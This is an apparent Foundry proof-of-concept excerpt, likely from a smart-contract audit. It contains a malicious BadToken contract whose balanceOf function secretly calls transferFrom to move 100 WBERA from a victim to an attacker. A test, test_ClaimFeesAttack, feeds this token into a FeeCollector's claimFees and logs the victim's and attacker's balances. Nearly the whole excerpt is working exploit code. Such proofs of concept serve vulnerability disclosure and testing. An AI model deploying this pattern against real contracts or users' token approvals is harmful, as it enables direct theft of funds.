...
contract BadToken is Test {
    constructor() { }

    function balanceOf(address target) external returns (uint256) {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        address wbera = address(0xF62849F9A0B5Bf2913b396098F7c7019b51A820a);
        uint256 retur = IERC20(wbera).balanceOf(target);
        IERC20(wbera).transferFrom(victim, attacker, 100 ether);
        return (retur);
    }
...
contract FeeCollectorTest is POLTest {
    ...
    function test_ClaimFeesAttack() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        _addFees();
        deal(address(wbera), address(victim), 100 ether);
        deal(address(wbera), address(attacker), 100 ether);
        ...
        wbera.approve(address(feeCollector), 100 ether);
        address[] memory feeTokens = new address[](1);
        address badToken = address(new BadToken());
        feeTokens[0] = badToken;
        // vm.expectEmit();
        // emit IFeeCollector.FeesClaimed(address(this), address(this), address(feeToken), 10 ether);
        console.log("victim: bera", (wbera).balanceOf(victim));
        console.log("attack: bera", (wbera).balanceOf(attacker));

        vm.prank(attacker);
        console.logAddress(address(wbera));
        feeCollector.claimFees(address(this), feeTokens);
        console.log("after victim: bera", (wbera).balanceOf(victim));
        console.log("after attack: bera", (wbera).balanceOf(attacker));
    }
